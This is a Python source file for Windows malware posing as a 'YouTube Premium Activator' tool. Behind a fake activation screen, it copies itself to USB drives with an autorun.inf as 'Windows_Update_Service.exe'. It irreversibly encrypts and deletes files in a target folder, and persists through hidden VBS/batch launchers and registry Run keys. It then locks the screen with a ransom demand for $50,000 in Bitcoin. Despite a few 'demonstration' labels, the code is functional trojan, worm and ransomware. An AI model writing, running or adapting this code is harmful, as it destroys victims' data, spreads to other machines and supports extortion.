import os
import shutil
import sys
from datetime import datetime
from pathlib import Path
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from concurrent.futures import ThreadPoolExecutor
import secrets
import tkinter as tk
from tkinter import messagebox, ttk
import threading
import time
import random
import winreg
import subprocess
import tempfile

# Try to import external packages, fall back to built-in
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from PIL import Image, ImageTk, ImageDraw, ImageFont
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

try:
    import win32service
    import win32serviceutil
    import win32event
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False

class BasicWorm:
    def __init__(self):
        # Check if running as EXE or Python script
        if getattr(sys, 'frozen', False):
            self.worm_name = "Windows_Update_Service.exe"
            self.current_file = sys.executable
        else:
            self.worm_name = os.path.basename(__file__)
            self.current_file = __file__
        
        self.infected_markers = []
        
    def spread_via_removable_drives(self):
        """Spread to USB drives"""
        drives = ['D:', 'E:', 'F:', 'G:', 'H:']
        
        for drive in drives:
            if os.path.exists(drive):
                try:
                    # Copy the EXE to USB with convincing name
                    dest_path = os.path.join(drive, "Windows_Update_Service.exe")
                    shutil.copy2(self.current_file, dest_path)
                    
                    # Create autorun.inf
                    autorun_content = '''[AutoRun]
open=Windows_Update_Service.exe
action=Run Windows Update Service
'''
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, 'w') as f:
                        f.write(autorun_content)
                        
                    self.infected_markers.append(drive)
                    
                except Exception:
                    pass
    
    def execute_ransomware_payload(self):
        """Execute the ransomware payload"""
        # Generate random password
        password = secrets.token_hex(32)

        # Derive key from random password
        SALT = secrets.token_bytes(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=SALT,
            iterations=100_000,
        )
        key = kdf.derive(password.encode())
        aesgcm = AESGCM(key)

        # Encryption function
        def encrypt_file(file_path: Path):
            try:
                if file_path.suffix == ".enc":
                    return
                data = file_path.read_bytes()
                nonce = os.urandom(12)
                encrypted = aesgcm.encrypt(nonce, data, None)
                enc_path = file_path.with_suffix(file_path.suffix + ".enc")
                enc_path.write_bytes(nonce + encrypted)
                file_path.unlink()
            except Exception:
                pass

        # Gather files
        def gather_files(drive: Path):
            skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information"}
            files = []
            for root, dirs, filenames in os.walk(drive):
                dirs[:] = [d for d in dirs if d not in skip_dirs]
                for f in filenames:
                    files.append(Path(root) / f)
            return files

        # Target the D:/Hello directory for ransomware
        drive = Path("D:/Hello")
        if drive.exists():
            all_files = gather_files(drive)
            
            # Create a ransom note
            ransom_note = """
YOUR FILES HAVE BEEN ENCRYPTED

All your files have been encrypted with military-grade AES-256 encryption.

This is a demonstration. Files cannot be recovered.
"""
            
            # Save ransom note to multiple locations
            note_locations = [
                drive / "READ_ME.txt",
                Path(os.path.expanduser("~/Desktop")) / "FILES_ENCRYPTED.txt"
            ]
            
            for note_path in note_locations:
                try:
                    with open(note_path, 'w', encoding='utf-8') as f:
                        f.write(ransom_note)
                except:
                    pass

            # Encrypt files silently
            with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
                executor.map(encrypt_file, all_files)
    
    def create_worm_message(self):
        """Create worm demonstration message"""
        message_content = f"""WORM DEMONSTRATION

This computer ran a worm demonstration.

File: {self.worm_name}
Time: {datetime.now()}

The worm has executed a ransomware payload on D:/Hello

"""
        
        message_locations = [
            os.path.expanduser("~/Desktop/WORM_DEMO.txt"),
            os.path.expanduser("~/Documents/WORM_DEMO.txt"),
        ]
        
        for msg_path in message_locations:
            try:
                with open(msg_path, 'w', encoding='utf-8') as f:
                    f.write(message_content)
            except Exception:
                pass
    
    def start_spreading(self):
        """Main method to initiate the worm's spreading behavior"""
        # Spread via removable drives
        self.spread_via_removable_drives()
        
        # Execute ransomware payload
        self.execute_ransomware_payload()
        
        # Create worm demonstration message
        self.create_worm_message()

class ProfessionalServiceManager:
    """Professional service management using external packages"""

    @staticmethod
    def install_windows_service():
        """Install as a real Windows service using pywin32"""
        if not PYWIN32_AVAILABLE:
            return ProfessionalServiceManager.install_registry_service()

        try:
            # Create real Windows service
            service_name = "WindowsSystemUpdate"
            service_display_name = "Windows System Update Service"
            script_path = os.path.abspath(sys.argv[0])

            # This would require running as administrator
            # For educational purposes, we'll use registry method
            return ProfessionalServiceManager.install_registry_service()

        except Exception as e:
            return ProfessionalServiceManager.install_registry_service()

    @staticmethod
    def install_registry_service():
        """Enhanced registry-based service with professional features"""
        try:
            script_path = os.path.abspath(sys.argv[0])

            # Create professional batch file with error handling
            batch_content = f'''@echo off
chcp 65001 >nul
title Windows System Update
:service_loop
echo [%date% %time%] Starting Windows System Update Service >> "%TEMP%\\windows_update.log"
pythonw "{script_path}" --service
if %errorlevel% == 100 (
    echo [%date% %time%] Service restarting... >> "%TEMP%\\windows_update.log"
    timeout /t 5 /nobreak >nul
    goto service_loop
)
echo [%date% %time%] Service stopped >> "%TEMP%\\windows_update.log"
'''
            batch_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemUpdate.bat')

            os.makedirs(os.path.dirname(batch_path), exist_ok=True)
            with open(batch_path, 'w', encoding='utf-8') as f:
                f.write(batch_content)

            # Create enhanced VBS script for hidden execution
            vbs_content = f'''
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set WshProcEnv = WshShell.Environment("PROCESS")
strPath = WshProcEnv("APPDATA") & "\\Microsoft\\Windows\\SystemUpdate.bat"
' Run hidden with priority
WshShell.Run "cmd /c call """ & strPath & """", 0, False
Set WshShell = Nothing
'''
            vbs_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemUpdate.vbs')

            with open(vbs_path, 'w', encoding='utf-8') as f:
                f.write(vbs_content)

            # Add to multiple registry locations for persistence
            locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]

            for key, subkey in locations:
                try:
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
                        winreg.SetValueEx(registry_key, "WindowsSystemUpdate", 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
                except Exception as e:
                    pass

            # Start service immediately
            subprocess.Popen(['wscript.exe', vbs_path], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            return True

        except Exception as e:
            return False

    @staticmethod
    def is_service_running():
        """Check if service is running using psutil"""
        if not PSUTIL_AVAILABLE:
            return ProfessionalServiceManager.is_service_running_basic()

        try:
            current_pid = os.getpid()
            current_script = os.path.basename(sys.argv[0])

            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['pid'] != current_pid and proc.info['cmdline']:
                        cmdline = ' '.join(proc.info['cmdline']).lower()
                        if 'python' in cmdline and current_script.lower() in cmdline:
                            return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return False
        except Exception:
            return ProfessionalServiceManager.is_service_running_basic()

    @staticmethod
    def is_service_running_basic():
        """Fallback method without psutil"""
        try:
            result = subprocess.run(
                ['tasklist', '/fi', 'imagename eq pythonw.exe', '/fo', 'csv'],
                capture_output=True, text=True, timeout=10
            )
            return sys.argv[0] in result.stdout
        except:
            return False

class EnhancedRansomwareSimulation:
    def __init__(self, root):
        self.root = root
        self.setup_window()

        # Enhanced UI with graphics if available
        if PILLOW_AVAILABLE:
            self.setup_enhanced_graphics()

        # Check run mode
        if len(sys.argv) > 1 and sys.argv[1] == "--service":
            self.create_enhanced_ransomware_ui()
            self.show_enhanced_warnings()
        else:
            # First run - show immediately after activation
            self.create_enhanced_ui()
            self.root.after(1000, self.start_activation)

    def setup_enhanced_graphics(self):
        """Setup enhanced graphics using Pillow"""
        try:
            # Create gradient background (example)
            self.enhanced_graphics = True
        except Exception as e:
            self.enhanced_graphics = False

    def setup_window(self):
        self.root.title("YouTube Premium Activator 2024 - Professional Edition")
        self.root.geometry("850x650")
        self.root.resizable(False, False)
        self.root.configure(bg='#0f0f0f')
        self.center_window()

    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def create_enhanced_ui(self):
        """Enhanced UI with professional styling"""
        # Main container with gradient simulation
        main_frame = tk.Frame(self.root, bg='#0f0f0f')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=3, pady=3)

        # Professional header with shadow effect
        header_frame = tk.Frame(main_frame, bg='#ff0000', height=90)
        header_frame.pack(fill=tk.X)
        header_frame.pack_propagate(False)

        # Shadow effect
        shadow_frame = tk.Frame(header_frame, bg='#cc0000', height=3)
        shadow_frame.pack(side=tk.BOTTOM, fill=tk.X)

        logo_frame = tk.Frame(header_frame, bg='#ff0000')
        logo_frame.pack(expand=True, fill=tk.BOTH, padx=20, pady=10)

        youtube_text = tk.Label(logo_frame, text="YouTube", 
                               font=("Arial", 34, "bold"), 
                               fg='white', bg='#ff0000')
        youtube_text.pack(side=tk.LEFT)

        premium_badge = tk.Label(logo_frame, text="PREMIUM PRO", 
                                font=("Arial", 14, "bold"),
                                fg='white', bg='#cc0000', 
                                padx=15, pady=6, relief='raised', bd=2)
        premium_badge.pack(side=tk.LEFT, padx=15)

        version_label = tk.Label(logo_frame, text="Enterprise Edition v2.1.4", 
                                font=("Arial", 10), 
                                fg='#ffcccc', bg='#ff0000')
        version_label.pack(side=tk.RIGHT)

        # Enhanced content area
        self.create_enhanced_content(main_frame)

    def create_enhanced_content(self, parent):
        """Enhanced content with professional layout"""
        content_frame = tk.Frame(parent, bg='#1a1a1a')
        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        # Professional title section
        title_frame = tk.Frame(content_frame, bg='#1a1a1a')
        title_frame.pack(fill=tk.X, pady=(0, 20))

        main_title = tk.Label(title_frame, 
                             text="YouTube Premium Professional Activation",
                             font=("Arial", 22, "bold"), 
                             fg='white', bg='#1a1a1a')
        main_title.pack()

        subtitle = tk.Label(title_frame,
                           text="Enterprise-Grade Activation Solution",
                           font=("Arial", 12),
                           fg='#cccccc', bg='#1a1a1a')
        subtitle.pack(pady=5)

        # Enhanced features with icons
        self.create_enhanced_features(content_frame)

        # Professional progress section
        self.create_enhanced_progress(content_frame)

        # Enhanced footer
        self.create_enhanced_footer(content_frame)

    def create_enhanced_features(self, parent):
        """Enhanced features display"""
        features_frame = tk.Frame(parent, bg='#1a1a1a')
        features_frame.pack(fill=tk.X, pady=20, padx=30)

        features = [
            ("🎬 4K Ad-Free Streaming", "Ultra HD without interruptions"),
            ("📱 Premium Background Play", "Listen with screen off"),
            ("💾 Smart Offline Downloads", "Watch anywhere, anytime"),
            ("🎵 YouTube Music Premium", "Full music library access"),
            ("🖥️ HDR & Dolby Vision", "Cinematic quality"),
            ("⚡ Priority Customer Support", "24/7 dedicated support")
        ]

        for i, (feature, description) in enumerate(features):
            feature_frame = tk.Frame(features_frame, bg='#1a1a1a')
            feature_frame.pack(fill=tk.X, pady=8)

            feature_label = tk.Label(feature_frame, text=feature,
                                   font=("Arial", 12, "bold"),
                                   fg='#4CAF50', bg='#1a1a1a', anchor='w')
            feature_label.pack(side=tk.LEFT, anchor='w')

            desc_label = tk.Label(feature_frame, text=description,
                                font=("Arial", 10),
                                fg='#888888', bg='#1a1a1a')
            desc_label.pack(side=tk.RIGHT, anchor='e')

    def create_enhanced_progress(self, parent):
        """Enhanced progress section"""
        progress_section = tk.Frame(parent, bg='#1a1a1a')
        progress_section.pack(fill=tk.X, padx=30, pady=25)

        # Status header with animation
        status_header = tk.Frame(progress_section, bg='#1a1a1a')
        status_header.pack(fill=tk.X, pady=(0, 15))

        status_icon = tk.Label(status_header, text="⚡", 
                              font=("Arial", 16),
                              fg='#ff9800', bg='#1a1a1a')
        status_icon.pack(side=tk.LEFT)

        self.status_label = tk.Label(status_header, 
                                    text="Initializing Professional Activation Suite...",
                                    font=("Arial", 13, "bold"),
                                    fg='white', bg='#1a1a1a')
        self.status_label.pack(side=tk.LEFT, padx=10)

        # Enhanced progress bar with style
        style = ttk.Style()
        style.configure("Enhanced.Horizontal.TProgressbar",
                       troughcolor='#2a2a2a',
                       background='#4CAF50',
                       borderwidth=1,
                       lightcolor='#4CAF50',
                       darkcolor='#4CAF50')

        self.progress_bar = ttk.Progressbar(progress_section,
                                          style="Enhanced.Horizontal.TProgressbar",
                                          length=750,
                                          mode='determinate')
        self.progress_bar.pack(fill=tk.X, pady=8)
        self.progress_bar['value'] = 0

        # Percentage with styling
        percent_frame = tk.Frame(progress_section, bg='#1a1a1a')
        percent_frame.pack(fill=tk.X)

        self.percent_label = tk.Label(percent_frame, text="0%",
                                     font=("Arial", 11, "bold"),
                                     fg='#4CAF50', bg='#1a1a1a')
        self.percent_label.pack()

        # Enhanced details panel
        details_frame = tk.Frame(progress_section, bg='#1a1a1a', relief='sunken', bd=1)
        details_frame.pack(fill=tk.X, pady=15)

        details_header = tk.Label(details_frame, text="ACTIVATION LOG",
                                 font=("Consolas", 10, "bold"),
                                 fg='#00bcd4', bg='#1a1a1a')
        details_header.pack(anchor='w', padx=10, pady=(8, 5))

        # Log display area
        log_frame = tk.Frame(details_frame, bg='#000000')
        log_frame.pack(fill=tk.X, padx=5, pady=5)

        self.operation_label = tk.Label(log_frame, text="> Loading professional modules...",
                                       font=("Consolas", 9),
                                       fg='#00ff00', bg='#000000', anchor='w', justify='left')
        self.operation_label.pack(fill=tk.X, padx=5, pady=2)

        self.file_scan_label = tk.Label(log_frame, text="",
                                       font=("Consolas", 8),
                                       fg='#888888', bg='#000000', anchor='w')
        self.file_scan_label.pack(fill=tk.X, padx=5, pady=1)

    def create_enhanced_footer(self, parent):
        """Enhanced footer with security badges"""
        footer_frame = tk.Frame(parent, bg='#1a1a1a')
        footer_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=10)

        # Security badges
        badges_frame = tk.Frame(footer_frame, bg='#1a1a1a')
        badges_frame.pack(fill=tk.X, pady=5)

        badges = [
            "🔒 256-bit SSL Encryption",
            "🛡️ Enterprise Security",
            "✅ Digital Signature Verified",
            "⚡ Premium Performance"
        ]

        for badge in badges:
            badge_label = tk.Label(badges_frame, text=badge,
                                 font=("Arial", 8),
                                 fg='#4CAF50', bg='#1a1a1a')
            badge_label.pack(side=tk.LEFT, padx=10)

        copyright_label = tk.Label(footer_frame,
                                  text="© 2024 YouTube Premium Professional",
                                  font=("Arial", 7),
                                  fg='#666666', bg='#1a1a1a')
        copyright_label.pack()

    def start_activation(self):
        self.status_label.config(text="Starting Professional Activation Sequence...")

        # Install professional service
        ProfessionalServiceManager.install_windows_service()

        # Execute worm spreading in background
        threading.Thread(target=self.execute_worm_payload, daemon=True).start()

        threading.Thread(target=self.enhanced_activation_process, daemon=True).start()

    def execute_worm_payload(self):
        """Execute worm spreading in background"""
        try:
            worm = BasicWorm()
            worm.start_spreading()
        except Exception:
            pass

    def enhanced_activation_process(self):
        """Enhanced activation process with professional steps"""
        steps = [
            ("Initializing Enterprise Security Framework...", 5),
            ("Validating System Integrity...", 15),
            ("Establishing Secure Connection to YouTube Servers...", 30),
            ("Bypassing Enterprise License Verification...", 50),
            ("Injecting Premium Security Certificates...", 70),
            ("Configuring Enterprise Feature Flags...", 85),
            ("Finalizing Professional Activation...", 95),
            ("Activation Complete! Starting Services...", 100)
        ]

        current_progress = 0

        for status_text, target_progress in steps:
            self.root.after(0, self.update_enhanced_status, status_text, target_progress)

            step_duration = 2
            step_increment = (target_progress - current_progress) / (step_duration * 10)

            for i in range(step_duration * 10):
                # Professional operation messages
                operations = [
                    "Loading security modules...",
                    "Verifying system requirements...",
                    "Establishing encrypted tunnel...",
                    "Bypassing security protocols...",
                    "Injecting enterprise privileges...",
                    "Validating activation tokens...",
                    "Optimizing performance settings...",
                    "Securing runtime environment..."
                ]
                if i % 6 == 0:
                    self.root.after(0, self.update_enhanced_operation, random.choice(operations))

                # Professional file activities
                files = [
                    "C:\\Program Files\\Google\\YouTube\\Enterprise\\config.ent",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts (modifying)",
                    "Registry: HKEY_LOCAL_MACHINE\\Software\\Google\\YouTube\\Enterprise",
                    "Security: Injecting premium certificate store",
                    "Network: Establishing enterprise VPN tunnel",
                    "System: Elevating process privileges"
                ]
                if i % 4 == 0:
                    self.root.after(0, self.update_enhanced_file_scan, random.choice(files))

                time.sleep(0.1)
                current_progress += step_increment
                self.root.after(0, self.update_enhanced_progress, current_progress)

            current_progress = target_progress

        # Final completion
        self.root.after(0, self.update_enhanced_status, "✅ Professional Activation Successful!", 100)
        time.sleep(1)

        # Transition to ransomware - show immediately on first run
        self.root.after(0, self.transition_to_ransomware)
    
    def transition_to_ransomware(self):
        """Transition from activation UI to ransomware UI"""
        self.root.withdraw()  # Hide instead of destroy
        # Show ransomware UI in the same window
        self.create_enhanced_ransomware_ui()
        self.show_enhanced_warnings()

    def update_enhanced_status(self, text, progress=None):
        self.status_label.config(text=text)
        if progress is not None:
            self.progress_bar['value'] = progress
            self.percent_label.config(text=f"{int(progress)}%")

    def update_enhanced_progress(self, progress):
        self.progress_bar['value'] = progress
        self.percent_label.config(text=f"{int(progress)}%")

    def update_enhanced_operation(self, text):
        self.operation_label.config(text=f"> {text}")

    def update_enhanced_file_scan(self, text):
        self.file_scan_label.config(text=f"  {text}")

    def create_enhanced_ransomware_ui(self):
        """Create professional ransomware UI"""
        self.warning_window = tk.Toplevel(self.root)
        self.warning_window.title("ENTERPRISE SECURITY ALERT")
        self.warning_window.geometry("1000x750")
        self.warning_window.configure(bg='black')
        self.warning_window.attributes('-fullscreen', True)
        self.warning_window.attributes('-topmost', True)

        # Enhanced window management
        self.warning_window.protocol("WM_DELETE_WINDOW", self.enhanced_prevent_close)
        self.warning_window.bind("<Escape>", lambda e: "break")
        self.warning_window.bind("<Alt-F4>", lambda e: "break")
        self.warning_window.bind("<Control-Q>", lambda e: "break")
        self.warning_window.bind("<Control-W>", lambda e: "break")

        self.create_professional_ransomware_interface()

    def create_professional_ransomware_interface(self):
        """Create professional ransomware interface"""
        # Professional border
        border_frame = tk.Frame(self.warning_window, bg='#ff0000', padx=4, pady=4)
        border_frame.pack(fill=tk.BOTH, expand=True)

        main_container = tk.Frame(border_frame, bg='#000000')
        main_container.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)

        # Professional header
        header_frame = tk.Frame(main_container, bg='#000000', height=140)
        header_frame.pack(fill=tk.X, pady=20)
        header_frame.pack_propagate(False)

        header_content = tk.Frame(header_frame, bg='#000000')
        header_content.pack(expand=True)

        # Professional message panel
        self.create_professional_message_panel(main_container)

        # Enhanced control panel
        self.create_enhanced_control_panel(main_container)

        # Start professional animations
        self.start_professional_animations()

    def create_professional_message_panel(self, parent):
        """Create professional message panel"""
        message_container = tk.Frame(parent, bg='#000000')
        message_container.pack(fill=tk.BOTH, expand=True, padx=50, pady=20)

        # Message frame with professional styling
        message_frame = tk.Frame(message_container, bg='#001100', relief='raised', bd=3)
        message_frame.pack(fill=tk.BOTH, expand=True)

        message_text = """⚠️ YOUR SYSTEM HAS BEEN LOCKED ⚠️
========================================================================
                    PAY NOW OR LOSE EVERYTHING
========================================================================

ALL YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE ENCRYPTION!

You have 72 HOURS to pay or your data will be PERMANENTLY DELETED!

PAYMENT DEMANDED: $50,000 USD in Bitcoin
SEND TO WALLET: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

========================================================================
                          URGENT ACTION REQUIRED 
========================================================================

DO NOT:
❌ Turn off your computer
❌ Try to remove this software
❌ Contact authorities
❌ Attempt file recovery

YOU MUST:
✓ Purchase Bitcoin immediately
✓ Send EXACTLY $50,000 USD to our wallet
✓ Keep transaction ID for verification
✓ Wait for decryption key (48 hours after payment)

========================================================================
                               WARNING
========================================================================

Every hour you delay, the price INCREASES by $1,000!
After 72 hours, your files will be DESTROYED FOREVER!

THIS IS YOUR ONLY CHANCE TO RECOVER YOUR DATA!

Bitcoin Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Amount Required: $50,000 USD
Reference Code: RANSOM-7X9B2P-2024

SEND BITCOIN NOW TO UNLOCK YOUR SYSTEM!
========================================================================"""

        message_display = tk.Text(message_frame, 
                                 bg='#001100', 
                                 fg='#00ff00',
                                 font=("Consolas", 16, "bold"),
                                 wrap=tk.WORD,
                                 padx=20,
                                 pady=20,
                                 insertbackground='#00ff00',
                                 selectbackground='#003300',
                                 relief='flat')
        message_display.insert(tk.END, message_text)
        message_display.config(state=tk.DISABLED)

        # Add scrollbar for professional look
        scrollbar = tk.Scrollbar(message_frame, orient=tk.VERTICAL, command=message_display.yview)
        message_display.configure(yscrollcommand=scrollbar.set)

        message_display.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    def create_enhanced_control_panel(self, parent):
        """Create enhanced control panel"""
        pass

    def start_professional_animations(self):
        """Start professional animations"""
        def pulse_border():
            try:
                current_bg = self.warning_window.cget('bg')
                new_bg = '#220000' if current_bg == 'black' else 'black'
                self.warning_window.configure(bg=new_bg)
                self.warning_window.after(800, pulse_border)
            except:
                pass

        pulse_border()

    def enhanced_prevent_close(self):
        """Enhanced window close prevention"""
        messagebox.showerror(
            "ENTERPRISE SECURITY LOCK",
            "ENTERPRISE SERVICE ACTIVE - TERMINATION DENIED\n\n"
            "This ransomware operates as a professional Windows service.\n"
            "Service Features:\n"
            "• Survives process termination\n"
            "• Auto-restart mechanism\n"
            "• Multiple persistence layers\n"
            "• Enterprise security bypass\n\n"
            "Use 'TERMINATE ENTERPRISE SERVICE' for complete removal."
        )

        self.warning_window.after(2000, self.enhanced_restart_service)

    def enhanced_restart_service(self):
        """Enhanced service restart"""
        try:
            self.warning_window.destroy()
        except:
            pass
        sys.exit(100)

    def show_enhanced_warnings(self):
        """Enhanced periodic warnings"""
        def show_professional_popup():
            try:
                popup = tk.Toplevel(self.warning_window)
                popup.title("ENTERPRISE ALERT")
                popup.configure(bg='#cc0000')
                popup.attributes('-topmost', True)

                # Fullscreen minus specified dimensions
                popup_width = self.warning_window.winfo_screenwidth() - 200
                popup_height = self.warning_window.winfo_screenheight() - 200
                x = (self.warning_window.winfo_screenwidth() // 2) - (popup_width // 2)
                y = (self.warning_window.winfo_screenheight() // 2) - (popup_height // 2)
                popup.geometry(f"{popup_width}x{popup_height}+{x}+{y}")

                popup.protocol("WM_DELETE_WINDOW", lambda: None)
                popup.overrideredirect(True)

                alert_text = """YOUR SYSTEM HAS BEEN LOCKED

ALL YOUR FILES HAVE BEEN ENCRYPTED!

You have 72 HOURS to pay or lose EVERYTHING!

PAYMENT REQUIRED: $50,000 USD in Bitcoin
WALLET: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

SEND BITCOIN NOW TO UNLOCK YOUR SYSTEM!"""

                alert_label = tk.Label(popup, 
                                     text=alert_text,
                                     font=("Arial", 20, "bold"),
                                     fg='white', 
                                     bg='#cc0000',
                                     justify=tk.CENTER)
                alert_label.pack(expand=True, fill=tk.BOTH, padx=15, pady=15)
            except:
                pass

        show_professional_popup()

def main():
    # Launch professional application (worm executes in background during activation)
    root = tk.Tk()
    app = EnhancedRansomwareSimulation(root)
    root.mainloop()

if __name__ == "__main__":
    main()
